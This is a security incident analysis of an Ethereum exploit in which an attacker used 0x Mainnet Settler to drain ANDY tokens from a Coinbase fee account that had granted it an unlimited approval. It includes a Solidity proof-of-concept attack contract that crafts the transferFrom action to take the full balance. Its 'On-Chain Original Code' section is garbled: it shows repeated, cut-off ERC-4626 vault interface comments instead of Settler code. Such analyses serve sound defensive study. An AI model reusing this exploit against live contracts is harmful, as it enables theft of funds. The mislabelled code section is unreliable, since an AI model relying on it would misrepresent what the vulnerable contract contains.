# Coinbase Fee Account — Excessive Approve Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-13 |
| **Protocol** | Coinbase (integrated with 0x Settler) |
| **Chain** | Ethereum |
| **Loss** | ~300,000 USD |
| **Attacker** | [0xC31a49D1c4C652aF57cEFDeF248f3c55b801c649](https://etherscan.io/address/0xC31a49D1c4C652aF57cEFDeF248f3c55b801c649) |
| **Attack Tx** | [0x33b2cb5b](https://etherscan.io/tx/0x33b2cb5bc3c0ccb97f0cc21e231ecb6457df242710dfce8d1b68935f0e05773b) |
| **Vulnerable Contract** | 0x Mainnet Settler ([0xDf31A70a](https://etherscan.io/address/0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f)) |
| **Root Cause** | Coinbase fee account mistakenly granted unlimited ERC-20 approve to 0x Settler, which allows arbitrary transferFrom execution |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/coinbase_exp.sol) |

---

## 1. Vulnerability Overview

Coinbase's fee recipient account (0x382f...) mistakenly granted unlimited approvals for multiple ERC-20 tokens to the 0x Protocol's Mainnet Settler contract. The 0x Settler is designed to execute arbitrary `actions` within its `execute()` function. The attacker exploited this by calling Settler's `execute()` with a `transferFrom(coinbaseFeeAccount, attacker, balance)` action for the `ANDY` token, draining approximately 300,000 USD worth of tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable state: Coinbase fee account granted unlimited approve to Settler
// ANDY.allowance(COINBASE_FEE, MAINNET_SETTLER) = type(uint256).max (set by mistake)

// 0x Settler's vulnerable execute function
contract MainnetSettler {
    function execute(
        AllowedSlippage calldata slippage,
        bytes[] calldata actions,  // executes arbitrary actions
        bytes32 data
    ) external payable returns (bool) {
        for (uint256 i = 0; i < actions.length; i++) {
            // ❌ Executes transferFrom within actions without restriction
            (bool success,) = address(this).call(actions[i]);
            require(success);
        }
        return true;
    }

    // Internal function: transfers tokens from an approved address to an arbitrary recipient
    function _transferFrom(address token, address from, address to, uint256 amount) internal {
        IERC20(token).transferFrom(from, to, amount);
    }
}

// ✅ Fix: restrict the from address in actions to msg.sender
function _transferFrom(address token, address from, address to, uint256 amount) internal {
    require(from == msg.sender, "Cannot transfer from arbitrary address");
    IERC20(token).transferFrom(from, to, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: src/flat/MainnetTakerSubmittedFlat.sol
function convertToAssets(uint256 shares) external view returns (uint256 assets);

    /// @notice Returns the maximum amount of the underlying asset that can be deposited into the Vault for the receiver,
    /// through a deposit call.
    /// @dev
    /// - MUST return a limited value if receiver is subject to some deposit limit.
    /// - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.
    /// - MUST NOT revert.
    function maxDeposit(address receiver) external view returns (uint256 maxAssets);

    /// @notice Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given
    /// current on-chain conditions.
    /// @dev
    /// - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit
    ///   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called
    ///   in the same transaction.
    /// - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
    ///   deposit would be accepted, regardless if the user has enough tokens approved, etc.
    /// - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
    /// - MUST NOT revert.
    ///
    /// NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
    /// share price or some other type of condition, meaning the depositor will lose assets by depositing.
    function previewDeposit(uint256 assets) external view returns (uint256 shares);

    /// @notice Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
    /// @dev
    /// - MUST emit the Deposit event.
    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
    ///   deposit execution, and are accounted for during deposit.
    /// - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
    ///   approving enough underlying tokens to the Vault contract, etc).
    ///
    /// NOTE: most implementations will require pre-approval of the Vault with the Vault's underlying asset token.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);

    /// @notice Returns the maximum amount of the Vault shares that can be minted for the receiver, through a mint call.
    /// @dev
    /// - MUST return a limited value if receiver is subject to some mint limit.
    /// - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of shares that may be minted.
    /// - MUST NOT revert.
    function maxMint(address receiver) external view returns (uint256 maxShares);

    /// @notice Allows an on-chain or off-chain user to simulate the effects of their mint at the current block, given
    /// current on-chain conditions.
    /// @dev
    /// - MUST return as close to and no fewer than the exact amount of assets that would be deposited in a mint call
    ///   in the same transaction. I.e. mint should return the same or fewer assets as previewMint if called in the
    ///   same transaction.
    /// - MUST NOT account for mint limits like those returned from maxMint and should always act as though the mint
    function maxDeposit(address receiver) external view returns (uint256 maxAssets);

    /// @notice Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given
    /// current on-chain conditions.
    /// @dev
    /// - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit
    ///   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called
    ///   in the same transaction.
    /// - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
    ///   deposit would be accepted, regardless if the user has enough tokens approved, etc.
    /// - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
    /// - MUST NOT revert.
    ///
    /// NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
    /// share price or some other type of condition, meaning the depositor will lose assets by depositing.
    function previewDeposit(uint256 assets) external view returns (uint256 shares);

    /// @notice Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
    /// @dev
    /// - MUST emit the Deposit event.
    /// - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
    ///   deposit execution, and are accounted for during deposit.
    /// - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
    ///   approving enough underlying tokens to the Vault contract, etc).
    ///
    /// NOTE: most implementations will require pre-approval of the Vault with the Vault's underlying asset token.
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);

    /// @notice Returns the maximum amount of the Vault shares that can be minted for the receiver, through a mint call.
    /// @dev
    /// - MUST return a limited value if receiver is subject to some mint limit.
    /// - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of shares that may be minted.
    /// - MUST NOT revert.
    function maxMint(address receiver) external view returns (uint256 maxShares);

    /// @notice Allows an on-chain or off-chain user to simulate the effects of their mint at the current block, given
    /// current on-chain conditions.
    /// @dev
    /// - MUST return as close to and no fewer than the exact amount of assets that would be deposited in a mint call
    ///   in the same transaction. I.e. mint should return the same or fewer assets as previewMint if called in the
    ///   same transaction.
    /// - MUST NOT account for mint limits like those returned from maxMint and should always act as though the mint
    ///   would be accepted, regardless if the user has enough tokens approved, etc.
    /// - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
    /// - MUST NOT revert.
    ///
    /// NOTE: any unfavorable discrepancy between convertToAssets and previewMint SHOULD be considered slippage in
    /// share price or some other type of condition, meaning the depositor will lose assets by minting.
    function previewMint(uint256 shares) external view returns (uint256 assets);
```

## 3. Attack Flow (ASCII Diagram)

```
[Precondition]
Coinbase fee account (0x382f)
  └─ ANDY.approve(MAINNET_SETTLER, max) ← set by mistake

[Attack]
Attacker
  │
  ├─1─▶ Check ANDY balance: ANDY balance of COINBASE_FEE account
  │
  ├─2─▶ Deploy AttackContract
  │
  ├─3─▶ MAINNET_SETTLER.execute(slippage, [action], "")
  │         └─ action = 0x38c9c147(0, 10000, ANDY, 0,
  │                       transferFrom(COINBASE_FEE, attacker, balance))
  │
  ├─4─▶ Inside Settler: ANDY.transferFrom(COINBASE_FEE, attacker, balance)
  │         └─ Succeeds thanks to the unlimited approve
  │
  └─5─▶ ANDY drained — ~300,000 USD stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract is Test {
    function attack() public payable {
        AllowedSlippage memory slippage = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20(address(0)),
            minAmountOut: 0
        });

        bytes[] memory actions = new bytes[](1);

        // Drain the full ANDY balance of the Coinbase fee account
        uint256 amount = IERC20(ANDY).balanceOf(COINBASE_FEE);

        // Construct the action using the Settler's internal transferFrom function selector
        bytes memory innerTransferFrom = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            COINBASE_FEE,   // from: Coinbase fee account (has unlimited approve)
            msg.sender,     // to: attacker
            amount          // amount: full balance
        );

        // Encode the action with the outer wrapper function selector (0x38c9c147)
        bytes memory action = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            uint256(0),
            uint256(10000),
            ANDY,
            uint256(0),
            innerTransferFrom
        );

        actions[0] = action;

        // Call Settler execute — drain entire ANDY balance
        IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Excessive token approval + arbitrary external call combination |
| **Attack Vector** | Mistakenly set unlimited approve + Settler's unrestricted transferFrom execution |
| **Impact Scope** | ANDY tokens held by Coinbase fee account (~300,000 USD) |
| **CWE** | CWE-732 (Incorrect Permission Assignment) + CWE-284 |
| **DASP** | Access Control |

## 6. Remediation Recommendations

1. **Strictly enforce the principle of minimal approval**: Never set unlimited approvals under any circumstances
2. **Automate periodic approval audits**: Automatically monitor the approval status of critical accounts
3. **Block arbitrary transferFrom in Settler**: Restrict the `from` parameter to `msg.sender` only
4. **Immediate revoke system**: Build a system to automatically revoke approvals the moment an anomalous approval is detected
5. **Multi-signature operations**: Process all approvals from fee accounts through multi-signature

## 7. Lessons Learned

- Even institutional actors (like Coinbase) can mistakenly set incorrect approvals — automated monitoring is essential.
- Contracts like 0x Settler that support "arbitrary action execution" are powerful but equally dangerous. If tokens can be moved arbitrarily from any approved account, approval management becomes critically important.
- The fact that the attacker spotted the suspicious approval and executed the attack approximately 2 hours later underscores the importance of on-chain monitoring — had an anomaly detection system been in place, the approval could have been revoked first.